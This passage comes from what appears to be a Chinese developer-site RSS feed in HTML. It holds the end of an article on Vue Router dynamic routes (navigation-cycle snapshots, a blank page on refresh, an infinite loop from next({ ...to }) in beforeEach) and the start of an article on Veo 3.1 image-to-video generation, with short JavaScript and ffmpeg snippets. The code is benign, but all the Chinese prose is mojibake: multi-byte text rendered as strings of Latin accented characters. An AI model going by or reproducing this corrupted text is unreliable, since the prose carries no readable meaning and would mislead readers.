<p>äºŒã€åœ¨è·³è½¬ä¹‹å‰åˆå§‹åŒ–è·¯ç”±è¡¨ã€‚æ­£ç¡®çš„é¡ºåºæ˜¯ï¼šå…ˆåŠ¨æ€æ·»åŠ è·¯ç”±ï¼ˆè®©è·¯ç”±è¡¨å˜æˆæœ€æ–°ï¼‰ï¼Œå†æ‰§è¡Œè·³è½¬ï¼ˆå¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œæ‹æ–°å¿«ç…§ï¼‰ï¼Œæ–°å¿«ç…§ä¼šåŒ…å«æœ€æ–°è·¯ç”±è¡¨ï¼Œè·³è½¬å¿…ç„¶èƒ½æ‰¾åˆ°å¯¹åº”è·¯ç”±ï¼Œä¸ä¼šç™½å±ã€‚</p>
<h2 data-id="heading-2">å¿«ç…§è§¦å‘æ—¶æœº</h2>
<p><strong>æ¯æ¬¡æœ‰æ•ˆè·³è½¬éƒ½ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„å¯¼èˆªå‘¨æœŸ</strong>â€”â€” å¿«ç…§å’Œ â€œå¯¼èˆªå‘¨æœŸâ€ æ˜¯ã€Œä¸€ä¸€å¯¹åº”ã€çš„ï¼šä¸€ä¸ªæ–°å¯¼èˆªå‘¨æœŸï¼Œå¿…ç„¶å¯¹åº”ä¸€æ¬¡æ–°å¿«ç…§ï¼›æ²¡æœ‰æ–°å¯¼èˆªå‘¨æœŸï¼Œå°±ä¸ä¼šæœ‰æ–°å¿«ç…§ã€‚å¯¼èˆªå‘¨æœŸå¼€å§‹-&gt;æ–°çš„å¿«ç…§-&gt;è·³è½¬</p>
<p><strong>æœ‰æ•ˆè·³è½¬ï¼šå¿…ç„¶å¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œæ‹æ–°å¿«ç…§</strong></p>
<p>åªè¦æ“ä½œèƒ½å¼•å‘ã€Œè·¯ç”±è·¯å¾„å˜åŒ–ã€æˆ–ã€Œè·¯ç”±æŸ¥è¯¢å‚æ•° / å“ˆå¸Œå€¼å˜åŒ–ã€ï¼ˆå³è·¯ç”±çŠ¶æ€æ”¹å˜ï¼‰ï¼Œéƒ½å±äºæœ‰æ•ˆè·³è½¬ï¼Œä¸€å®šä¼šå¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œè¿›è€Œæ‹æ‘„æ–°å¿«ç…§ã€‚</p>
<ol>
<li><strong>è·¯å¾„å®Œå…¨å˜åŒ–</strong>ï¼ˆæœ€å¸¸è§ï¼‰</li>
</ol>
<ul>
<li>
<ul>
<li>ç¤ºä¾‹ï¼š<code>/login</code> â†’ <code>/dashboard</code>ã€<code>/dashboard</code> â†’ <code>/profile</code>ã€é¡µé¢åˆ·æ–° <code>/dashboard</code>ã€ç‚¹å‡» <code>&lt;router-link to="/setting"&gt;</code>ã€æµè§ˆå™¨å‰è¿› / åé€€ï¼ˆè·¯å¾„å˜åŒ–ï¼‰ï¼›</li>
<li>ç»“æœï¼šå¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œæ‹æ–°å¿«ç…§ï¼ˆå¿«ç…§ä¸ºå½“å‰è·¯ç”±è¡¨å…¨è²Œï¼‰ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>è·¯å¾„ä¸å˜ï¼ŒæŸ¥è¯¢å‚æ•°å˜åŒ–</strong></li>
</ol>
<ul>
<li>
<ul>
<li>ç¤ºä¾‹ï¼š<code>/list?page=1</code> â†’ <code>/list?page=2</code>ï¼ˆè·¯å¾„éƒ½æ˜¯ <code>/list</code>ï¼Œä»…æŸ¥è¯¢å‚æ•° <code>page</code> å˜åŒ–ï¼‰ã€<code>/detail?id=1</code> â†’ <code>/detail?id=2</code>ï¼›</li>
<li>ç»“æœï¼šåŒæ ·å¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œæ‹æ–°å¿«ç…§ï¼ˆå“ªæ€•è·¯å¾„ä¸å˜ï¼ŒæŸ¥è¯¢å‚æ•°å˜åŒ–ä¹Ÿå±äºè·¯ç”±çŠ¶æ€å˜åŒ–ï¼Œä¼šè§¦å‘æ–°å‘¨æœŸï¼‰ã€‚</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>è·¯å¾„ä¸å˜ï¼Œå“ˆå¸Œå€¼å˜åŒ–</strong></li>
</ol>
<ul>
<li>
<ul>
<li>ç¤ºä¾‹ï¼š<code>/home#top</code> â†’ <code>/home#bottom</code>ï¼ˆè·¯å¾„ <code>/home</code> ä¸å˜ï¼Œä»…å“ˆå¸Œå€¼ <code>#</code> åé¢çš„å†…å®¹å˜åŒ–ï¼‰ï¼›</li>
<li>ç»“æœï¼šå¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œæ‹æ–°å¿«ç…§ã€‚</li>
</ul>
</li>
</ul>
<p><strong>æ— æ•ˆè·³è½¬ï¼šä¸å¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œä¸æ‹æ–°å¿«ç…§</strong></p>
<p>åªæœ‰ä¸€ç§æƒ…å†µå±äºæ— æ•ˆè·³è½¬ï¼š<strong>è·³è½¬çš„ç›®æ ‡è·¯ç”±ä¸å½“å‰è·¯ç”±å®Œå…¨ä¸€è‡´ï¼ˆè·¯å¾„ã€æŸ¥è¯¢å‚æ•°ã€å“ˆå¸Œå€¼å‡æ— å˜åŒ–ï¼‰</strong> ï¼Œæ­¤æ—¶ Vue Router ä¼šç›´æ¥å¿½ç•¥è¯¥è·³è½¬è¯·æ±‚ï¼Œä¸ä¼šå¯åŠ¨æ–°å¯¼èˆªå‘¨æœŸï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šæ‹æ‘„æ–°å¿«ç…§ã€‚</p>
<ol>
<li>å½“å‰è·¯ç”±æ˜¯ <code>/dashboard</code>ï¼Œæ‰§è¡Œ <code>router.push('/dashboard')</code>ï¼ˆè·¯å¾„ã€å‚æ•°ã€å“ˆå¸Œå‡ä¸€è‡´ï¼‰ï¼›</li>
<li>å½“å‰è·¯ç”±æ˜¯ <code>/list?page=1</code>ï¼Œæ‰§è¡Œ <code>router.push('/list?page=1')</code>ï¼ˆæŸ¥è¯¢å‚æ•°æ— å˜åŒ–ï¼‰ï¼›</li>
<li>å½“å‰è·¯ç”±æ˜¯ <code>/home#top</code>ï¼Œç‚¹å‡» <code>&lt;router-link to="/home#top"&gt;</code>ï¼ˆå“ˆå¸Œå€¼æ— å˜åŒ–ï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-3">æ³¨æ„</h2>
<pre><code class="hljs language-js" lang="js">router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> !== <span class="hljs-string">'/login'</span> &amp;&amp; !userStore.<span class="hljs-property">token</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>)
  }
  <span class="hljs-keyword">if</span> (!isInitRouter) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åˆå§‹åŒ–èœå•Menu'</span>)
    <span class="hljs-title function_">initRouter</span>()
    isInitRouter = <span class="hljs-literal">true</span>
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>({ ...to }) <span class="hljs-comment">// è¿™æ ·å†™ä¼šå¾ªç¯å¡æ­»</span>
})
</code></pre>
<p>åŸå› ï¼šè§¦å‘äº†æ— é™å¾ªç¯çš„å¯¼èˆªå‘¨æœŸâ€”â€”return next({ ...to }) ä¼šæŒç»­ç»ˆæ­¢å½“å‰å¯¼èˆªå‘¨æœŸï¼ŒåŒæ—¶å¯åŠ¨ä¸€ä¸ªå’Œå½“å‰ç›®æ ‡å®Œå…¨ä¸€è‡´çš„æ–°å¯¼èˆªå‘¨æœŸï¼Œè€Œæ–°å‘¨æœŸåˆä¼šé‡å¤æ‰§è¡Œå®ˆå«é€»è¾‘ï¼Œå†æ¬¡è§¦å‘ return next({ ...to })ï¼Œå¦‚æ­¤å¾€å¤æ²¡æœ‰å°½å¤´ï¼Œæœ€ç»ˆå¯¼è‡´æµè§ˆå™¨ä¸»çº¿ç¨‹è¢«å ç”¨ï¼Œé¡µé¢å¡æ­»ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šä»…åœ¨åŠ¨æ€è·¯ç”±åˆå§‹åŒ–åï¼ŒæŒ‰éœ€æ‰§è¡Œ next({ ...to })ï¼›å…¶ä»–åœºæ™¯æ‰§è¡Œ next()ï¼ŒåŒæ—¶æ·»åŠ  replace: true ä¼˜åŒ–ä½“éªŒã€‚</p>
<h2 data-id="heading-4">æ­¥éª¤æ¼”ç¤º</h2>
<h3 data-id="heading-5">ä¸€ã€æ­£å¸¸è¿›å…¥ï¼ˆä»Â <code>/login</code>Â è·³è½¬Â <code>/dashboard</code>ï¼‰ï¼šæ²¡é—®é¢˜çš„æµç¨‹</h3>
<p>æ­£å¸¸è¿›å…¥æ˜¯ã€Œå…ˆè®¿é—®Â <code>/login</code>ï¼Œç™»å½•åå†è·³è½¬Â <code>/dashboard</code>ã€ï¼Œä¸¤æ­¥èµ°ï¼Œåˆå§‹åŒ–æ—¶æœºæå‰äº†ï¼š</p>
<h4 data-id="heading-6">æ­¥éª¤ 1ï¼šè®¿é—®Â <code>/login</code>ï¼ˆç¬¬ä¸€ä¸ªå¯¼èˆªå‘¨æœŸï¼Œæå‰å®Œæˆåˆå§‹åŒ–ï¼‰</h4>
<ol>
<li>
<p>è§¦å‘å¯¼èˆªï¼šç”¨æˆ·è¾“å…¥ç½‘å€è®¿é—®Â <code>/login</code>Â â†’ å¯åŠ¨ã€Œå¯¼èˆªå‘¨æœŸ Aã€ï¼›</p>
</li>
<li>
<p>æ‹å¿«ç…§ Aï¼šå¯åŠ¨ç¬é—´æ‹å¿«ç…§ï¼Œæ­¤æ—¶è·¯ç”±è¡¨åªæœ‰é™æ€è·¯ç”±Â <code>/login</code>ï¼ˆå¿«ç…§ A = é™æ€è·¯ç”±è¡¨ï¼‰ï¼›</p>
</li>
<li>
<p>æ‰§è¡ŒÂ <code>beforeEach</code>Â å®ˆå«ï¼š</p>
<ul>
<li>ç™»å½•æ ¡éªŒï¼š<code>to.path === '/login'</code>ï¼Œæ¡ä»¶ä¸æˆç«‹ï¼Œè·³è¿‡ï¼›</li>
<li><code>!isInitRouter === true</code>Â â†’ æ‰§è¡ŒÂ <code>initRouter()</code>ï¼ˆæ³¨å†ŒÂ <code>/dashboard</code>Â ç­‰åŠ¨æ€è·¯ç”±ï¼Œ<strong>è·¯ç”±è¡¨æ›´æ–°ä¸ºã€Œé™æ€ + åŠ¨æ€ã€</strong>ï¼‰ï¼›</li>
<li><code>isInitRouter</code>Â è®¾ä¸ºÂ <code>true</code>ï¼›</li>
<li><code>return next()</code>Â â†’ ç»§ç»­å¯¼èˆªå‘¨æœŸ Aï¼Œç”¨å¿«ç…§ A åŒ¹é…Â <code>/login</code>ï¼ŒåŒ¹é…æˆåŠŸ â†’ æ˜¾ç¤ºÂ <code>/login</code>Â é¡µé¢ï¼›</li>
</ul>
</li>
<li>
<p>å…³é”®ç»“æœï¼šæ­¤æ—¶ã€Œè·¯ç”±è¡¨å·²ç»æ›´æ–°ã€ï¼ˆæœ‰Â <code>/dashboard</code>ï¼‰ï¼Œåªæ˜¯å¯¼èˆªå‘¨æœŸ A çš„å¿«ç…§ A æ˜¯æ—§çš„ï¼Œä½†ä¸å½±å“Â <code>/login</code>Â æ˜¾ç¤ºã€‚</p>
</li>
</ol>
<h4 data-id="heading-7">æ­¥éª¤ 2ï¼šç™»å½•æˆåŠŸï¼Œè·³è½¬Â <code>/dashboard</code>ï¼ˆç¬¬äºŒä¸ªå¯¼èˆªå‘¨æœŸï¼Œå¿«ç…§æ‹åˆ°æ–°è·¯ç”±è¡¨ï¼‰</h4>
<ol>
<li>
<p>è§¦å‘å¯¼èˆªï¼šç™»å½•æˆåŠŸåæ‰§è¡ŒÂ <code>router.push('/dashboard')</code>Â â†’ å¯åŠ¨ã€Œå¯¼èˆªå‘¨æœŸ Bã€ï¼›</p>
</li>
<li>
<p>æ‹å¿«ç…§ Bï¼šå¯åŠ¨ç¬é—´æ‹å¿«ç…§ï¼Œæ­¤æ—¶è·¯ç”±è¡¨å·²ç»æ˜¯ã€Œé™æ€ + åŠ¨æ€ã€ï¼ˆæ­¥éª¤ 1 å·²åˆå§‹åŒ–ï¼‰ï¼Œ<strong>å¿«ç…§ B = å®Œæ•´è·¯ç”±è¡¨ï¼ˆå«Â <code>/dashboard</code>ï¼‰</strong> ï¼›</p>
</li>
<li>
<p>æ‰§è¡ŒÂ <code>beforeEach</code>Â å®ˆå«ï¼š</p>
<ul>
<li>ç™»å½•æ ¡éªŒï¼š<code>to.path === '/dashboard'</code>Â ä¸”æœ‰Â <code>token</code>ï¼Œè·³è¿‡ï¼›</li>
<li><code>!isInitRouter === false</code>Â â†’ è·³è¿‡Â <code>initRouter()</code>ï¼›</li>
<li><code>return next()</code>Â â†’ ç»§ç»­å¯¼èˆªå‘¨æœŸ Bï¼Œç”¨å¿«ç…§ B åŒ¹é…Â <code>/dashboard</code>ï¼ŒåŒ¹é…æˆåŠŸ â†’ æ­£å¸¸æ˜¾ç¤ºé¡µé¢ï¼›</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">æ­£å¸¸è¿›å…¥çš„æ ¸å¿ƒï¼šåˆå§‹åŒ–æå‰å®Œæˆ</h4>
<p><code>initRouter()</code>Â åœ¨ç¬¬ä¸€ä¸ªå¯¼èˆªå‘¨æœŸï¼ˆ<code>/login</code>ï¼‰å°±æ‰§è¡Œäº†ï¼Œè·¯ç”±è¡¨æå‰æ›´æ–°ï¼›åç»­è·³è½¬Â <code>/dashboard</code>Â æ—¶ï¼Œæ–°å¯¼èˆªå‘¨æœŸçš„å¿«ç…§èƒ½æ‹åˆ°å®Œæ•´è·¯ç”±è¡¨ï¼Œè‡ªç„¶æ²¡é—®é¢˜ã€‚</p>
<hr/>
<h3 data-id="heading-9">äºŒã€åˆ·æ–°Â <code>/dashboard</code>ï¼šä¸è¡Œçš„æµç¨‹</h3>
<p>åˆ·æ–°æ˜¯ã€Œç›´æ¥è®¿é—®Â <code>/dashboard</code>ã€ï¼Œä¸€æ­¥åˆ°ä½ï¼Œåˆå§‹åŒ–æ—¶æœºæ»åäº†ï¼š</p>
<h4 data-id="heading-10">æ­¥éª¤ 1ï¼šåˆ·æ–°Â <code>/dashboard</code>ï¼ˆå”¯ä¸€å¯¼èˆªå‘¨æœŸï¼Œå…ˆæ‹å¿«ç…§ååˆå§‹åŒ–ï¼‰</h4>
<ol>
<li>
<p>è§¦å‘å¯¼èˆªï¼šç”¨æˆ·åˆ·æ–°Â <code>/dashboard</code>Â ç½‘å€ â†’ å¯åŠ¨ã€Œå¯¼èˆªå‘¨æœŸ Cã€ï¼›</p>
</li>
<li>
<p>æ‹å¿«ç…§ Cï¼šå¯åŠ¨ç¬é—´æ‹å¿«ç…§ï¼Œæ­¤æ—¶è·¯ç”±è¡¨è¿˜æ˜¯ã€Œåˆå§‹é™æ€è·¯ç”±ã€ï¼ˆæ— Â <code>/dashboard</code>ï¼Œ<code>initRouter()</code>Â è¿˜æ²¡æ‰§è¡Œï¼‰ï¼Œ<strong>å¿«ç…§ C = æ—§é™æ€è·¯ç”±è¡¨</strong>ï¼›</p>
</li>
<li>
<p>æ‰§è¡ŒÂ <code>beforeEach</code>Â å®ˆå«ï¼š</p>
<ul>
<li>ç™»å½•æ ¡éªŒï¼š<code>to.path === '/dashboard'</code>Â ä¸”æœ‰Â <code>token</code>ï¼Œè·³è¿‡ï¼›</li>
<li><code>!isInitRouter === true</code>Â â†’ æ‰§è¡ŒÂ <code>initRouter()</code>ï¼ˆæ³¨å†ŒÂ <code>/dashboard</code>ï¼Œ<strong>è·¯ç”±è¡¨æ›´æ–°ä¸ºã€Œé™æ€ + åŠ¨æ€ã€</strong>ï¼‰ï¼›</li>
<li><code>isInitRouter</code>Â è®¾ä¸ºÂ <code>true</code>ï¼›</li>
<li><code>return next()</code>Â â†’ ç»§ç»­å¯¼èˆªå‘¨æœŸ Cï¼Œ<strong>ç”¨å¿«ç…§ Cï¼ˆæ—§é™æ€è·¯ç”±è¡¨ï¼‰åŒ¹é…Â <code>/dashboard</code></strong>ï¼›</li>
</ul>
</li>
<li>
<p>å…³é”®ç»“æœï¼šå¿«ç…§ C ä¸­æ²¡æœ‰Â <code>/dashboard</code>ï¼ŒåŒ¹é…å¤±è´¥ â†’ é¡µé¢ç™½å±ï¼ˆæ— ç»„ä»¶å¯æ¸²æŸ“ï¼‰ã€‚</p>
</li>
</ol>
<h4 data-id="heading-11">åˆ·æ–°ä¸è¡Œçš„æ ¸å¿ƒï¼šé¡ºåºåäº†</h4>
<p>ã€Œå¯¼èˆªå‘¨æœŸ C å¯åŠ¨ï¼ˆæ‹æ—§å¿«ç…§ï¼‰ã€åœ¨å‰ï¼Œã€Œ<code>initRouter()</code>Â åˆå§‹åŒ–ï¼ˆæ›´æ–°è·¯ç”±è¡¨ï¼‰ã€åœ¨åï¼›æ—§å¯¼èˆªå‘¨æœŸåªèƒ½ç”¨å·²æ‹å¥½çš„å¿«ç…§ Cï¼Œå“ªæ€•åç»­è·¯ç”±è¡¨æ›´æ–°äº†ï¼Œä¹Ÿæ— æ³•æ”¹å˜å¿«ç…§ C çš„å†…å®¹ï¼Œå¯¼è‡´åŒ¹é…å¤±è´¥ã€‚</p>
<h2 data-id="heading-12">æ‰©å±•</h2>
<p>vue-router@3 å’Œ vue-router@4 è·¯ç”±å®ˆå«çš„returnå’Œnextçš„åŒºåˆ«æ˜¯å¦è§¦å‘è¯·çœ‹ä¸‹ä¸€ç¯‡æ–‡ç« ã€ŠåŠ¨æ€è·¯ç”±è·³è½¬å¤±æ•ˆï¼ŸåŸæ¥æ˜¯Â <code>next()</code>Â ä¸Â <code>return</code>Â çš„ç”¨æ³•æåäº†ï¼ã€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é¦–å°¾å¸§åˆ°ä¸æ»‘åŠ¨ç”»ï¼šVeo 3.1 Image-to-Video å·¥ç¨‹åŒ–å®è·µ]]></title>    <link>https://juejin.cn/post/7589908657681662002</link>    <guid>https://juejin.cn/post/7589908657681662002</guid>    <pubDate>2026-01-01T11:06:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589908657681662002" data-draft-id="7589903248619733018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é¦–å°¾å¸§åˆ°ä¸æ»‘åŠ¨ç”»ï¼šVeo 3.1 Image-to-Video å·¥ç¨‹åŒ–å®è·µ"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-01T11:06:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="draking"/> <meta itemprop="url" content="https://juejin.cn/user/1065861228790043"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é¦–å°¾å¸§åˆ°ä¸æ»‘åŠ¨ç”»ï¼šVeo 3.1 Image-to-Video å·¥ç¨‹åŒ–å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1065861228790043/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    draking
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T11:06:06.000Z" title="Thu Jan 01 2026 11:06:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡åŸºäºå®é™…é¡¹ç›®ç»éªŒï¼Œæ·±å…¥å‰–æ Veo 3.1 é¦–å°¾å¸§æ’å€¼æŠ€æœ¯çš„å·¥ç¨‹å®ç°ã€‚</p>
</blockquote>
<h2 data-id="heading-0">æŠ€æœ¯æ¶æ„æ€»è§ˆ</h2>
<p>é¦–å°¾å¸§è§†é¢‘ç”Ÿæˆæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª<strong>å—çº¦æŸçš„è§†é¢‘æ’å€¼é—®é¢˜</strong>â€”â€”ç»™å®šèµ·å§‹å¸§ A å’Œç»“æŸå¸§ Bï¼ŒAI æ¨¡å‹éœ€è¦åœ¨æ—¶åŸŸä¸Šç”Ÿæˆè¯­ä¹‰è¿è´¯ã€è¿åŠ¨å¹³æ»‘çš„ä¸­é—´å¸§åºåˆ—ã€‚</p>
<blockquote>
<p><strong>æŠ€æœ¯æ´å¯Ÿ</strong>ï¼šé¦–å°¾å¸§æ’å€¼çš„æ ¸å¿ƒéš¾ç‚¹ä¸åœ¨äºå•å¸§è´¨é‡ï¼Œè€Œåœ¨äºå¸§é—´è¿åŠ¨çš„è¯­ä¹‰ä¸€è‡´æ€§ã€‚</p>
</blockquote>
<h2 data-id="heading-1">æ ¸å¿ƒå‚æ•°å¯¹ç…§è¡¨</h2>

























<table><thead><tr><th>å‚æ•°ç»´åº¦</th><th>veo-3.1-fast</th><th>veo-3.1 (Standard)</th></tr></thead><tbody><tr><td><strong>ç”Ÿæˆè€—æ—¶</strong></td><td>60-90s</td><td>120-180s</td></tr><tr><td><strong>æœ€å¤§æ—¶é•¿</strong></td><td>8s</td><td>8s</td></tr><tr><td><strong>API æˆæœ¬</strong></td><td>$0.05/æ¬¡</td><td>$0.10/æ¬¡</td></tr></tbody></table>
<h2 data-id="heading-2">å·¥ç¨‹å®ç°</h2>
<h3 data-id="heading-3">é¦–å°¾å¸§è‡ªåŠ¨å…³è”</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">resolveFrames</span>(<span class="hljs-params">scenes, dir</span>) {
  <span class="hljs-keyword">return</span> scenes.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">scene, i</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> next = scenes[i + <span class="hljs-number">1</span>];
    <span class="hljs-keyword">return</span> {
      ...scene,
      <span class="hljs-attr">firstFrame</span>: <span class="hljs-string">`scene_<span class="hljs-subst">${scene.id}</span>.png`</span>,
      <span class="hljs-attr">lastFrame</span>: next ? <span class="hljs-string">`scene_<span class="hljs-subst">${next.id}</span>.png`</span> : <span class="hljs-literal">null</span>
    };
  });
}
</code></pre>
<h3 data-id="heading-4">å¹¶å‘æ§åˆ¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> pLimit = <span class="hljs-built_in">require</span>(<span class="hljs-string">'p-limit'</span>);
<span class="hljs-keyword">const</span> limit = <span class="hljs-title function_">pLimit</span>(<span class="hljs-number">2</span>);

<span class="hljs-keyword">const</span> tasks = scenes.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> <span class="hljs-title function_">limit</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">generateVideo</span>(s)));
<span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(tasks);
</code></pre>
<h2 data-id="heading-5">åå¤„ç†</h2>
<pre><code class="hljs language-bash" lang="bash">ffmpeg -f concat -i list.txt -c copy merged.mp4
ffmpeg -i merged.mp4 -movflags +faststart web.mp4
</code></pre>
<h2 data-id="heading-6">è¸©å‘è®°å½•</h2>
<ol>
